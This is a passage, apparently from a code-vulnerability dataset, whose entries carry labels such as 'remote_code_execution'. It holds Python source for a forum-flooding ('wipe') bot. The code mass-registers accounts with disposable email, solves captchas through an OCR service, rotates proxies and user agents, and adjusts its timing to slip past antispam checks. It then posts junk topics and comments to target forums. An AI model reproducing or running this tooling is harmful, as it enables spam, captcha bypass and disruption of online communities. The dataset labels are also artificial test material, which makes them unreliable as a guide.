self.update_caprate(False)\n                raise\n            except beon.Redir as e:\n                self.log.warn(e)\n                self.log.warn('Using non-ajax addcomment')\n                self.captcha_wrapper(self.site.addcomment, self.site.addcommentfin,\n                                     target, msg, tuser, **kvargs)\n        except beon.Success as e:\n            self.counters['comments_added'] += 1\n            self.log.debug(e)\n            raise\n        except beon.Antispam as e:\n            self.counters['antispam'] += 1\n            self.comment_successtimeout = self.comment_successtimeout + 0.1\n            self.log.info('Antispam exc caught, comment_successtimeout + 0.1, cur: %f',\n                self.comment_successtimeout)\n            raise\n        except beon.GuestDeny as e:\n            self.counters['delogin'] += 1\n            self.log.warn('%s, trying to log in', e)\n            self.schedule_first(self.relogin)\n            raise\n        except beon.Bumplimit as e:\n            self.log.info(e)\n            self.pc.sets['bumplimit'].add(tpair)\n            raise\n        except (beon.Closed, beon.UserDeny) as e:\n            self.pc.sets['closed'].add(tpair)\n            if self.stoponclose:\n                self.log.info(e)\n                raise beon.PermClosed(\"%s:%s is closed\", tpair, e.answer)\n            else:\n                self.log.info('%s, starting 300s remove timer', e)\n                self.pc.add_waiting('closed', tpair, 300)\n                raise\n        except beon.Wait5Min as e:\n            self.counters['wait5mincount'] += 1\n            self.log.warn(e)\n            raise\n        except beon.TemporaryError as e:\n            self.log.warn(e)\n            raise\n        except beon.PermanentError as e:\n            self.log.error(e)\n            raise\n\n    def addtopic(self, msg, subj, forum='1', tuser=None, **kvargs):\n        try:\n            self.captcha_wrapper(self.site.addtopicinc, self.site.addtopicfin,\n                                 msg, forum, subj, tuser, **kvargs)\n        except beon.Success as e:\n            self.counters['topics_added'] += 1\n            self.log.debug(e)\n            raise\n        except beon.Wait5Min as e:\n            self.counters['wait5min'] += 1\n            raise\n            # self._bancount += 1\n            # if 'login' in self.site.ud:\n            #     self.log.warn(e)\n            #     self.log.warn('Trying to change user')\n            #     self.pc.sets['pending'].add(self.site.ud['login'])\n            #     self.pc.add_waiting('pending', self.site.ud['login'], 300)\n            #     self.dologin()\n            # else:\n            #     raise\n        except beon.GuestDeny as e:\n            if 'login' not in self.site.ud:\n                raise\n            self.counters['delogin'] += 1\n            self.log.warn('%s, trying to log in', e)\n            self.schedule_first(self.dologin)\n            raise\n\n    def register(self, login, passwd, name, email, **kvargs):\n        self.logined = False\n        try:\n            self.captcha_wrapper(self.site.reginc, self.site.regfin,\n                                 login, passwd, name, email, **kvargs)\n        except beon.Success as e:\n            self.log.info(e)\n            self.logined = True\n            self.counters['users_registered'] += 1\n            raise\n\n    def solve_captcha(self, page):\n        # with cstate(self, WipeState.deobfuscating_capage):\n        self.log.info('Deobfuscating capage')\n        capair = self.w.deobfuscate_capage(self.site.domain, page)\n        self.log.info('Answer: %s', repr(capair))\n        if len(capair) != 2:\n            raise PermOCRError('Invalid answer from Evaluator')\n        self.log.info('Downloading captcha image')\n        try:\n            img = self.http_request(capair[1])\n        except sup.net.HTTPError as e:\n            # check error code here\n            self.log.error(e)\n            raise PermOCRError('404 Not Found on caurl', cahash=capair[0])\n        self.log.info('Sending captcha image to solver')\n        try:\n            result, cid = self.w.solve_captcha(img)\n        except OCRError as e:\n            e.cahash = capair[0]\n            raise\n        return capair[0], result, cid\n\n    def report_code(self, cid, status):\n        self.log.info('Reporting %s code for %s', status, cid)\n        self.w.report_code(cid, status)\n        self.counters['captcha_codes_reported'] += 1\n\n    def run(self, caller):\n        self.w = caller\n        self.log = logging.getLogger(self.name)\n        self.run_time = Ticker()\n        cst = cstate(self, WipeState.starting)\n        cst.__enter__()\n        self.mailrequester = self.mrc(self.noproxy_rp, self.w.running, self.w.sleep)\n\n        # Get our own logger here, or use worker's?\n        self.log.info('Starting')\n        self.run_time.tick()\n\n        def drop_user_handler(interface, method, data):\n            self.log.info('drop-user signal recieved')\n            self.dologin()\n\n        self.w.p.wz.set_sig_handler(b'WipeSkel', b'drop-user', drop_user_handler)\n\n        self.w.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeSkel')\n        self.w.p.sig_sock.setsockopt(zmq.SUBSCRIBE, bytes(self.name, 'utf-8'))\n\n        try:\n            self._run()\n        except Exception as e:\n            self.log.exception(e)\n        cst.__exit__(None, None, None)\n        with cstate(self, WipeState.terminating):\n            self.w.p.sig_sock.setsockopt(zmq.UNSUBSCRIBE, b'WipeSkel')\n            self.w.p.sig_sock.setsockopt(zmq.UNSUBSCRIBE, bytes(self.name, 'utf-8'))\n            self.w.p.wz.del_sig_handler(b'WipeSkel', b'drop-user')\n            self.log.info(repr(self.counters))\n        self.log.info('Terminating, runtime is %ds', self.run_time.elapsed(False))\n/n/n/n", "label": 0, "vtype": "remote_code_execution"}, {"id": "42b020edfe6b23b245938d23ff7a0484333d6450", "code": "/evproxy.py/n/n# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nimport wzrpc\nfrom sup.ticker import Ticker\n\nclass EvaluatorProxy:\n    def __init__(self, ev_init, *args, **kvargs):\n        super().__init__()\n        self.ev_init = ev_init\n        self.bind_kt_ticker = Ticker()\n        self.bind_kt = 5\n\n    def handle_evaluate(self, reqid, interface, method, data):\n        domain, page = data\n        self.p.log.info('Recvd page %s, working on', reqid)\n        res = self.ev.solve_capage(domain, page)\n        self.p.log.info('Done, sending answer: %s', res)\n        self.p.send_success_rep(reqid, [v.encode('utf-8') for v in res])\n\n    def send_keepalive(self):\n        msg = self.p.wz.make_req_msg(b'Router', b'bind-keepalive', [],\n            self.handle_keepalive_reply)\n        msg.insert(0, b'')\n        self.p.wz_sock.send_multipart(msg)\n\n    def handle_keepalive_reply(self, reqid, seqnum, status, data):\n        if status == wzrpc.status.success:\n            self.p.log.debug('Keepalive was successfull')\n        elif status == wzrpc.status.e_req_denied:\n            self.p.log.warn('Keepalive status {0}, reauthentificating and rebinding'.\n                format(wzrpc.name_status(status)))\n            self.p.auth_requests()\n            self.p.bind_methods()\n        elif status == wzrpc.status.e_timeout:\n            self.p.log.warn('Keepalive timeout')\n        else:\n            self.p.log.warn('Keepalive status {0}'.\n                format(wzrpc.name_status(status)))\n\n    def __call__(self, parent):\n        self.p = parent\n        self.p.wz_connect()\n        self.p.wz_auth_requests = [\n            (b'Router', b'auth-bind-route'),\n            (b'Router', b'auth-unbind-route'),\n            (b'Router', b'auth-set-route-type')]\n        self.p.wz_bind_methods = [\n            (b'Evaluator', b'evaluate', self.handle_evaluate, wzrpc.routetype.random)]\n        self.p.auth_requests()\n        self.p.bind_methods()\n        self.ev = self.ev_init()\n        self.bind_kt_ticker.tick()\n        while self.p.running.is_set():\n            socks = self.p.poll()\n            if self.bind_kt_ticker.elapsed(False) > self.bind_kt:\n                self.bind_kt_ticker.tick()\n                self.send_keepalive()\n/n/n/n/lib/wzrpc/wzhandler.py/n/n# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nfrom . import *\nfrom .wzbase import WZBase\n\nclass WZHandler(WZBase):\n    def __init__(self):\n        self.req_handlers = {}\n        self.response_handlers = {}\n        self.sig_handlers = {}\n        self.iden_reqid_map = BijectiveSetMap()\n\n    def set_req_handler(self, interface, method, fun):\n        self.req_handlers[(interface, method)] = fun\n\n    def set_response_handler(self, reqid, fun):\n        self.response_handlers[reqid] = fun\n\n    def set_sig_handler(self, interface, method, fun):\n        self.sig_handlers[(interface, method)] = fun\n    \n    def del_req_handler(self, interface, method):\n        del self.req_handlers[(interface, method)]\n\n    def del_response_handler(self, reqid):\n        del self.response_handlers[reqid]\n\n    def del_sig_handler(self, interface, method):\n        del self.sig_handlers[(interface, method)]\n\n    def _parse_req(self, iden, msg, reqid, interface, method):\n        try:\n            handler = self.req_handlers[(interface, method)]\n        except KeyError:\n            try:\n                handler = self.req_handlers[(interface, None)]\n            except KeyError:\n                raise WZENoReqHandler(iden, reqid,\n                    'No req handler for %s,%s'%(interface, method))\n        if iden:\n            self.iden_reqid_map.add_value(tuple(iden), reqid)\n        handler(reqid, interface, method, msg[1:])\n        return ()\n\n    def _parse_rep(self, iden, msg, reqid, seqnum, status):\n        try:\n            handler = self.response_handlers[reqid]\n            if seqnum == 0:\n                del self.response_handlers[reqid]\n        except KeyError:\n            raise WZENoHandler(iden, 'No rep handler for reqid')\n        handler(reqid, seqnum, status, msg[1:])\n        return ()\n\n    def _parse_sig(self, iden, msg, interface, method):\n        try:\n            handler = self.sig_handlers[(interface, method)]\n        except KeyError:\n            raise WZENoHandler(iden, 'No handler for sig %s,%s'%(interface, method))\n        handler(interface, method, msg[1:])\n        return ()\n\n    def make_req_msg(self, interface, method, args, fun, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        msg = make_req_msg(interface, method, args, reqid)\n        self.set_response_handler(reqid, fun)\n        return msg\n    \n    def make_router_req_msg(self, iden, interface, method, args, fun, reqid=None):\n        msg = iden[:]\n        msg.append(b'')\n        msg.extend(self.make_req_msg(interface, method, args, fun, reqid))\n        return msg\n    \n    def make_router_rep_msg(self, reqid, seqnum, status, answer):\n        iden = self.iden_reqid_map.get_key(reqid)\n        if seqnum == 0:\n            self.iden_reqid_map.del_value(iden, reqid)\n        msg = list(iden)\n        msg.append(b'')\n        msg.extend(make_rep_msg(reqid, seqnum, status, answer))\n        return msg\n\n    def get_iden(self, reqid):\n        return self.iden_reqid_map.get_key(reqid)\n\n    def get_reqids(self, iden):\n        return self.iden_reqid_map.get_values(iden)\n\n    def make_reqid(self):\n        while True:\n            reqid = random.randint(1, (2**64)-1)\n            if not reqid in self.response_handlers:\n                return reqid\n        \n    def make_auth_req_data(self, interface, method, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, make_auth_hash(interface, method, reqid, key)]\n        return (b'Router', b'auth-request', args, reqid)\n\n    def make_auth_bind_route_data(self, interface, method, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        \n        return (b'Router', b'auth-bind-route', args, reqid)\n\n    def make_auth_unbind_route_data(self, interface, method, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, make_auth_hash(interface, method, reqid, key)]        \n        return (b'Router', b'auth-unbind-route', args, reqid)\n\n    def make_auth_set_route_type_data(self, interface, method, type_, key, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        args = [interface, method, struct.pack('!B', type_),\n                make_auth_hash(interface, method, reqid, key)]\n        return (b'Router', b'auth-set-route-type', args, reqid)\n\n    def make_auth_clear_data(self, reqid=None):\n        if not reqid:\n            reqid = self.make_reqid()\n        return (b'Router', b'auth-clear', [], reqid)\n\n    def req_from_data(self, d, fun):\n        return self.make_req_msg(d[0], d[1], d[2], fun, d[3])\n  \n    def _parse_err(self, iden, msg, status):\n        pass\n\n    def _handle_nil(self, iden, msg):\n        pass\n/n/n/n/lib/wzworkers.py/n/nimport zmq\nimport threading, multiprocessing\nimport logging\nfrom sup.ticker import Ticker\n# from sup import split_frames\nimport wzrpc\nfrom wzrpc.wzhandler import WZHandler\nimport wzauth_data\n\nclass WorkerInterrupt(Exception):\n    '''Exception to raise when self.running is cleared'''\n    def __init__(self):\n        super().__init__('Worker was interrupted at runtime')\n\nclass Suspend(Exception):\n    # if we need this at all.\n    '''Exception to raise on suspend signal'''\n    def __init__(self, interval, *args, **kvargs):\n        self.interval = interval\n        super().__init__(*args, **kvargs)\n\nclass Resume(Exception):\n    '''Exception to raise when suspend sleep is interrupted'''\n\nclass WZWorkerBase:\n    def __init__(self, wz_addr, fun, args=(), kvargs={},\n            name=None, start_timer=None, poll_timeout=None,\n            pargs=(), pkvargs={}):\n        super().__init__(*pargs, **pkvargs)\n        self.name = name if name else type(self).__name__\n        self.start_timer = start_timer\n        self.poll_timeout = poll_timeout if poll_timeout else 5*1000\n        self.call = (fun, args, kvargs)\n\n        self.wz_addr = wz_addr\n        self.wz_auth_requests = []\n        self.wz_bind_methods = []\n        self.wz_poll_timeout = 30\n\n    def __sinit__(self):\n        '''Initializes thread-local interface on startup'''\n        self.log = logging.getLogger(self.name)\n        self.running = threading.Event()\n        self.sleep_ticker = Ticker()\n        self.poller = zmq.Poller()\n\n        s = self.ctx.socket(zmq.SUB)\n        self.poller.register(s, zmq.POLLIN)\n        s.setsockopt(zmq.IPV6, True)\n        s.connect(self.sig_addr)\n        s.setsockopt(zmq.SUBSCRIBE, b'GLOBAL')\n        s.setsockopt(zmq.SUBSCRIBE, b'WZWorker')\n        s.setsockopt(zmq.SUBSCRIBE, bytes(self.name, 'utf-8'))\n        self.sig_sock = s\n\n        s = self.ctx.socket(zmq.DEALER)\n        self.poller.register(s, zmq.POLLIN)\n        s.setsockopt(zmq.IPV6, True)\n        self.wz_sock = s\n\n        self.wz = WZHandler()\n\n        def term_handler(interface, method, data):\n            self.log.info(\n                'Termination signal %s recieved',\n                repr((interface, method, data)))\n            self.term()\n            raise WorkerInterrupt()\n        self.wz.set_sig_handler(b'WZWorker', b'terminate', term_handler)\n\n        def resumehandler(interface, method, data):\n            self.log.info('Resume signal %s recieved',\n                repr((interface, method, data)))\n            raise Resume()\n\n        self.wz.set_sig_handler(b'WZWorker', b'resume', term_handler)\n        self.running.set()\n\n    def wz_connect(self):\n        self.wz_sock.connect(self.wz_addr)\n\n    def wz_wait_reply(self, fun, interface, method, data, reqid=None, timeout=None):\n        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz\n        timeout = timeout if timeout else self.wz_poll_timeout\n        rs = wzrpc.RequestState(fun)\n        msg = self.wz.make_req_msg(interface, method, data,\n                                   rs.accept, reqid)\n        msg.insert(0, b'')\n        s.send_multipart(msg)\n        t.tick()\n        while self.running.is_set():\n            p(timeout*1000)\n            if rs.finished:\n                if rs.retry:\n                    msg = self.wz.make_req_msg(interface, method, data,\n                        rs.accept, reqid)\n                    msg.insert(0, b'')\n                    s.send_multipart(msg)\n                    rs.finished = False\n                    rs.retry = False\n                    continue\n                return\n            elapsed = t.elapsed(False)\n            if elapsed >= timeout:\n                t.tick()\n                # Notify fun about the timeout\n                rs.accept(None, 0, 255, [elapsed])\n                # fun sets rs.retry = True if it wants to retry\n        raise WorkerInterrupt()\n    \n    def wz_multiwait(self, requests):\n        # TODO: rewrite the retry loop\n        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz\n        timeout = self.wz_poll_timeout\n        rslist = []\n        msgdict = {}\n        for request in requests:\n            rs = wzrpc.RequestState(request[0])\n            rslist.append(rs)\n            msg = self.wz.make_req_msg(request[1][0], request[1][1], request[1][2],\n                                    rs.accept, request[1][3])\n            msg.insert(0, b'')\n            msgdict[rs] = msg\n            s.send_multipart(msg)\n        while self.running.is_set():\n            flag = 0\n            for rs in rslist:\n                if rs.finished:\n                    if not rs.retry:\n                        del msgdict[rs]\n                        continue\n                    s.send_multipart(msgdict[rs])\n                    rs.finished = False\n                    rs.retry = False\n                flag = 1\n            if not flag:\n                return\n            # check rs before polling, since we don't want to notify finished one\n            # about the timeout\n            t.tick()\n            p(timeout*1000)\n            if t.elapsed(False) >= timeout:\n                for rs in rslist:\n                    if not rs.finished:\n                        rs.accept(None, 0, 255, []) # Notify fun about the timeout\n                        rs.finished = True # fun sets rs.retry = True if it wants to retry\n        raise WorkerInterrupt()\n\n    def auth_requests(self):\n        for i, m in self.wz_auth_requests:\n            def accept(that, reqid, seqnum, status, data):\n                if status == wzrpc.status.success:\n                    self.log.debug('Successfull auth for (%s, %s)', i, m)\n                elif status == wzrpc.status.e_auth_wrong_hash:\n                    raise beon.PermanentError(\n                        'Cannot authentificate for ({0}, {1}), {2}: {3}'.\\\n                        format(i, m, wzrpc.name_status(status), repr(data)))\n                elif wzrpc.status.e_timeout:\n                    self.log.warn('Timeout {0}, retrying'.format(data[0]))\n                    that.retry = True\n                else:\n                    self.log.warning('Recvd unknown reply for (%s, %s) %s: %s', i, m,\n                        wzrpc.name_status(status), repr(data))\n            self.wz_wait_reply(accept,\n                *self.wz.make_auth_req_data(i, m, wzauth_data.request[i, m]))\n\n\n    def bind_route(self, i, m, f):\n        self.log.debug('Binding %s,%s route', i, m)\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.wz.set_req_handler(i, m, f)\n                self.log.debug('Succesfully binded route (%s, %s)', i, m)\n            elif status == wzrpc.status.e_req_denied:\n                self.log.warn('Status {0}, reauthentificating'.\\\n                    format(wzrpc.name_status(status)))\n                self.auth_requests()\n            elif wzrpc.status.e_timeout:\n                self.log.warn('Timeout {0}, retrying'.format(data[0]))\n                that.retry = True\n            else:\n                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))\n                that.retry = True\n        return self.wz_wait_reply(accept,\n                *self.wz.make_auth_bind_route_data(i, m, wzauth_data.bind_route[i, m]))\n\n    def set_route_type(self, i, m, t):\n        self.log.debug('Setting %s,%s type to %d', i, m, t)\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.log.debug('Succesfully set route type for (%s, %s) to %s', i, m,\n                    wzrpc.name_route_type(t))\n            elif status == wzrpc.status.e_req_denied:\n                self.log.warn('Status {0}, reauthentificating'.\\\n                    format(wzrpc.name_status(status)))\n                self.auth_requests()\n            else:\n                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))\n                that.retry = True\n        return self.wz_wait_reply(accept,\n            *self.wz.make_auth_set_route_type_data(i, m, t,\n                wzauth_data.set_route_type[i, m]))\n\n    def unbind_route(self, i, m):\n        if not (i, m) in self.wz.req_handlers:\n            self.log.debug('Route %s,%s was not bound', i, m)\n            return\n        self.log.debug('Unbinding route %s,%s', i, m)\n        self.wz.del_req_handler(i, m)\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.log.debug('Route unbinded for (%s, %s)', i, m)\n            else:\n                self.log.warn('Status %s, passing', wzrpc.name_status(status))\n        return self.wz_wait_reply(accept,\n            *self.wz.make_auth_unbind_route_data(i, m, wzauth_data.bind_route[i, m]))\n    \n    def clear_auth(self):\n        self.log.debug('Clearing our auth records')\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.log.debug('Auth records on router were cleared')\n            else:\n                self.log.warn('Status %s, passing', wzrpc.name_status(status))\n        return self.wz_wait_reply(accept, *self.wz.make_auth_clear_data())\n\n    def bind_methods(self):\n        for i, m, f, t in self.wz_bind_methods:\n            self.set_route_type(i, m, t)\n            self.bind_route(i, m, f)\n    \n    def unbind_methods(self):  \n        for i, m, f, t in self.wz_bind_methods:\n            self.unbind_route(i, m)\n        #self.clear_auth()\n\n    def send_rep(self, reqid, seqnum, status, data):\n        self.wz_sock.send_multipart(\n            self.wz.make_router_rep_msg(reqid, seqnum, status, data))\n\n    def send_success_rep(self, reqid, data):\n        self.send_rep(reqid, 0, wzrpc.status.success, data)\n    \n    def send_error_rep(self, reqid, data):\n        self.send_rep(reqid, 0, wzrpc.status.error, data)\n\n    def send_wz_error(self, reqid, data, seqid=0):\n        msg = self.wz.make_dealer_rep_msg(\n            reqid, seqid, wzrpc.status.error, data)\n        self.wz_sock.send_multipart(msg)\n        \n    def send_to_router(self, msg):\n        msg.insert(0, b'')\n        self.wz_sock.send_multipart(msg)\n    \n    # def bind_sig_route(self, routetype, interface, method, fun):\n    #     self.log.info('Binding %s,%s as type %d signal route',\n    #                   interface, method, routetype)\n    #     self.wz.set_signal_handler(interface, method, fun)\n    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'bind-sig-route',\n    #                                       [interface, method],\n    #                                       self.accept_ok)\n    #     self.wz_sock.send_multipart(msg)\n\n    # def unbind_sig_route(self, interface, method):\n    #     self.log.info('Deleting %s,%s signal route', interface, method)\n    #     self.wz.del_signal_handler(interface, method)\n    #     msg = self.wz.make_dealer_sig_msg(b'Router', b'unbind-sig-route',\n    #                                       [interface, method],\n    #                                       self.accept_ok)\n    #     self.wz_sock.send_multipart(msg)\n\n    def inter_sleep(self, timeout):\n        self.sleep_ticker.tick()\n        self.poll(timeout * 1000)\n        while self.sleep_ticker.elapsed(False) < timeout:\n            try:\n                self.poll(timeout * 1000)\n            except Resume as e:\n                return\n\n    def poll(self, timeout=None):\n        try:\n            socks = dict(self.poller.poll(timeout if timeout != None\n                else self.poll_timeout))\n        except zmq.ZMQError as e:\n            self.log.error(e)\n            return\n        if socks.get(self.sig_sock) == zmq.POLLIN:\n            # No special handling or same-socket replies are necessary for signals.\n            # Backwards socket replies may be added here.\n            frames = self.sig_sock.recv_multipart()\n            try:\n                self.wz.parse_msg(frames[0], frames[1:])\n            except wzrpc.WZError as e:\n                self.log.warn(e)\n        if socks.get(self.wz_sock) == zmq.POLLIN:\n            self.process_wz_msg(self.wz_sock.recv_multipart())\n        return socks\n\n    def process_wz_msg(self, frames):\n        try:\n            for nfr in self.wz.parse_router_msg(frames):\n                # Send replies from the handler, for cases when it's methods were rewritten.\n                self.wz_sock.send_multipart(nfr)\n        except wzrpc.WZErrorRep as e:\n            self.log.info(e)\n            self.wz_sock.send_multipart(e.rep_msg)\n        except wzrpc.WZError as e:\n            self.log.warn(e)\n\n    def run(self):\n        self.__sinit__()\n        if self.start_timer:\n            self.inter_sleep(self.start_timer)\n        if self.running:\n            self.log.info('Starting')\n            try:\n                self.child = self.call[0](*self.call[1], **self.call[2])\n                self.child(self)\n            except WorkerInterrupt as e:\n                self.log.warn(e)\n            except Exception as e:\n                self.log.exception(e)\n            self.log.info('Terminating')\n        else:\n            self.log.info('Aborted')\n        self.running.set() # wz_multiwait needs this to avoid another state check.\n        self.unbind_methods()\n        self.running.clear()\n        self.wz_sock.close()\n        self.sig_sock.close()\n    \n    def term(self):\n        self.running.clear()\n\n\nclass WZWorkerThread(WZWorkerBase, threading.Thread):\n    def start(self, ctx, sig_addr, *args, **kvargs):\n        self.ctx = ctx\n        self.sig_addr = sig_addr\n        threading.Thread.start(self, *args, **kvargs)\n\nclass WZWorkerProcess(WZWorkerBase, multiprocessing.Process):\n    def start(self, sig_addr, *args, **kvargs):\n        self.sig_addr = sig_addr\n        multiprocessing.Process.start(self, *args, **kvargs)\n    \n    def __sinit__(self):\n        self.ctx = zmq.Context()\n        super().__sinit__()\n/n/n/n/unistart.py/n/n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nimport sys\nif 'lib' not in sys.path:\n    sys.path.append('lib')\nimport os, signal, logging, threading, re, traceback, time\nimport random\nimport zmq\nfrom queue import Queue\nimport sup\nimport wzworkers as workers\nfrom dataloader import DataLoader\nfrom uniwipe import UniWipe\nfrom wipeskel import *\nimport wzrpc\nfrom beon import regexp\nimport pickle\n\nfrom logging import config\nfrom logconfig import logging_config\nconfig.dictConfig(logging_config)\nlogger = logging.getLogger()\n\nctx = zmq.Context()\nsig_addr = 'ipc://signals'\nsig_sock = ctx.socket(zmq.PUB)\nsig_sock.bind(sig_addr)\n\n# Settings for you\ndomains = set() # d.witch_domains\ntargets = dict() # d.witch_targets\nprotected = set() # will be removed later\nforums = dict() # target forums\n\n# from lib import textgen\n# with open('data.txt', 'rt') as f:\n#     model = textgen.train(f.read())\n# def mesasge():\n#     while True:\n#         s = textgen.generate_sentence(model)\n#         try:\n#             s.encode('cp1251')\n#             break\n#         except Exception:\n#             continue\n#     return s\n\ndef message():\n    msg = []\n    # msg.append('[video-youtube-'+\n    #            random.choice(('3odl-KoNZwk', 'bu55q_3YtOY', '4YPiCeLwh5o',\n    #                           'eSBybJGZoCU', 'ZtWTUt2RZh0', 'VXa9tXcMhXQ',))\n    #            +']')\n    msg.append('[image-original-none-http://simg4.gelbooru.com/'\n               + '/images/db/1d/db1dfb62a40f5ced2043bb8966da9a98.png]')\n    msg.append('\u041a\u0430\u0436\u0434\u044b\u0439 \u0445\u043e\u0447\u0435\u0442 \u0434\u0440\u0443\u0436\u0438\u0442\u044c \u0441 \u044f\u0434\u0435\u0440\u043d\u043e\u0439 \u0431\u043e\u043c\u0431\u043e\u0439.')\n    # msg.append('[video-youtube-'+random.choice(\n    #     # ('WdDb_RId-xU', 'EFL1-fL-WtM', 'uAOoiIkFQq4',\n    #     #  'eZO3K_4yceU', '1c1lT_HgJNo', 'WOkvVVaJ2Ks',\n    #     #  'KYq90TEdxIE', 'rWBM2whL0bI', '0PDy_MKYo4A'))\n    #     #('GabBLLOT6vw', 'qgvOpSquCAY', 'zUe-z9DZBNo', '4fCbfDEKZss', 'uIE-JgmkmdM'))\n    #     ('42JQYPioVo4', 'jD6j072Ep1M', 'mPyF5ovoIVs', 'cEEi1BHycb0', 'PuA1Wf8nkxw',\n    #      'ASJ9qlsPgHU', 'DP1ZDW9_xOo', 'bgSqH9LT-mI', ))\n    # +']')\n    # http://simg2.gelbooru.com//images/626/58ca1c9a8ffcdedd0e2eb6f33c9389cb7588f0d1.jpg\n    # msg.append('Enjoy the view!')\n    msg.append(str(random.randint(0, 9999999999)))\n    return '\\n'.join(msg)\n\ndef sbjfun():\n    # return 'Out of the darkness we will rise, into the light we will dwell'\n    return sup.randstr(1, 30)\n\n# End\nimport argparse\n\nparser = argparse.ArgumentParser(add_help=True)\nparser.add_argument('--only-cache', '-C', action='store_true',\n    help=\"Disables any requests in DataLoader (includes Witch)\")\nparser.add_argument('--no-shell', '-N', action='store_true',\n    help=\"Sleep instead of starting the shell\")\nparser.add_argument('--tcount', '-t', type=int, default=10,\n    help='WipeThread count')\nparser.add_argument('--ecount', '-e', type=int, default=0,\n    help='EvaluatorProxy count')\nparser.add_argument('--upload-avatar', action='store_true', default=False,\n    help='Upload random avatar after registration')\nparser.add_argument('--av-dir', default='randav', help='Directory with avatars')\nparser.add_argument('--rp-timeout', '-T', type=int, default=10,\n    help='Default rp timeout in seconds')\nparser.add_argument('--conlimit', type=int, default=3,\n    help='http_request conlimit')\nparser.add_argument('--noproxy-timeout', type=int, default=5,\n    help='noproxy_rp timeout')\n\nparser.add_argument('--caprate_minp', type=int, default=5,\n    help='Cap rate minimum possible count for limit check')\nparser.add_argument('--caprate_limit', type=float, default=0.8,\n    help='Captcha rate limit')\n\nparser.add_argument('--comment_successtimeout', type=float, default=0.8,\n    help='Comment success timeout')\nparser.add_argument('--topic_successtimeout', type=float, default=0.1,\n    help='Topic success timeout')\nparser.add_argument('--errortimeout', type=float, default=3,\n    help='Error timeout')\n\n\nparser.add_argument('--stop-on-closed', action='store_true', default=False,\n    help='Forget about closed topics')\nparser.add_argument('--die-on-neterror', action='store_true', default=False,\n    help='Terminate spawn in case of too many NetErrors')\n\nc = parser.parse_args()\n\n# rps = {}\n\nnoproxy_rp = sup.net.RequestPerformer()\nnoproxy_rp.proxy = ''\nnoproxy_rp.timeout = c.noproxy_timeout\nnoproxy_rp.timeout = c.rp_timeout\n\n# rps[''] = noproxy_rp\n\n# Achtung: DataLoader probably isn't thread-safe.\nd = DataLoader(noproxy_rp, c.only_cache)\nc.router_addr = d.addrs['rpcrouter']\nnoproxy_rp.useragent = random.choice(d.ua_list)\n\ndef terminate():\n    logger.info('Shutdown initiated')\n    # send_passthrough([b'GLOBAL', b'WZWorker', b'terminate'])\n    send_to_wm([b'GLOBAL', b'WZWorker', b'terminate'])\n    for t in threading.enumerate():\n        if isinstance(t, threading.Timer):\n            t.cancel()\n    # try:\n    #     wm.term()\n    #     wm.join()\n    # except: # WM instance is not created yet.\n    #     pass\n    logger.info('Exiting')\n\ndef interrupt_handler(signal, frame):\n    pass # Just do nothing\n\ndef terminate_handler(signal, frame):\n    terminate()\n\nsignal.signal(signal.SIGINT, interrupt_handler)\nsignal.signal(signal.SIGTERM, terminate_handler)\n\ndef make_net(proxy, proxytype):\n    # if proxy in rps:\n    #     return rps[proxy]\n    net = sup.net.RequestPerformer()\n    net.proxy = proxy\n    if proxytype == 'HTTP' or proxytype == 'HTTPS':\n        net.proxy_type = sup.proxytype.http\n    elif proxytype == 'SOCKS4':\n        net.proxy_type = sup.proxytype.socks4\n    elif proxytype == 'SOCKS5':\n        net.proxy_type = sup.proxytype.socks5\n    else:\n        raise TypeError('Invalid proxytype %s' % proxytype)\n    # rps[proxy] = net\n    net.useragent = random.choice(d.ua_list)\n    net.timeout = c.rp_timeout\n    return net\n\n# UniWipe patching start\ndef upload_avatar(self, ud):\n    if ('avatar_uploaded' in ud[0] and\n        ud[0]['avatar_uploaded'] is True):\n        return\n    files = []\n    for sd in os.walk(c.av_dir):\n        files.extend(sd[2])\n    av = os.path.join(sd[0], random.choice(files))\n    self.log.info('Uploading %s as new avatar', av)\n    self.site.uploadavatar('0', av)\n    ud[0]['avatar'] = av\n    ud[0]['avatar_uploaded'] = True\n\nfrom lib.mailinator import Mailinator\n# from lib.tempmail import TempMail as Mailinator\n\n# Move this to WipeManager\ndef create_spawn(proxy, proxytype, pc, uq=None):\n    for domain in domains:\n        if domain in targets:\n            tlist = targets[domain]\n        else:\n            tlist = list()\n            targets[domain] = tlist\n        if domain in forums:\n            fset = forums[domain]\n        else:\n            fset = set()\n            forums[domain] = fset\n        net = make_net(proxy, proxytype)\n        net.cookiefname = (proxy if proxy else 'noproxy')+'_'+domain\n        w = UniWipe(fset, tlist, sbjfun, message, pc, net, domain, Mailinator,\n            uq(domain) if uq else None)\n        w.stoponclose = c.stop_on_closed\n        w.die_on_neterror = c.die_on_neterror\n        w.caprate_minp = c.caprate_minp\n        w.caprate_limit = c.caprate_limit\n        w.conlimit = c.conlimit\n        w.comment_successtimeout = 0.2\n        if c.upload_avatar:\n            w.hooks['post_login'].append(upload_avatar)\n        yield w\n\n# UniWipe patching end\n\nclass WipeManager:\n    def __init__(self, config, *args, **kvargs):\n        super().__init__(*args, **kvargs)\n        self.newproxyfile = 'newproxies.txt'\n        self.proxylist = set()\n        self.c = config\n        self.threads = []\n        self.processes = []\n        self.th_sa = 'inproc://wm-wth.sock'\n        self.th_ba = 'inproc://wm-back.sock'\n        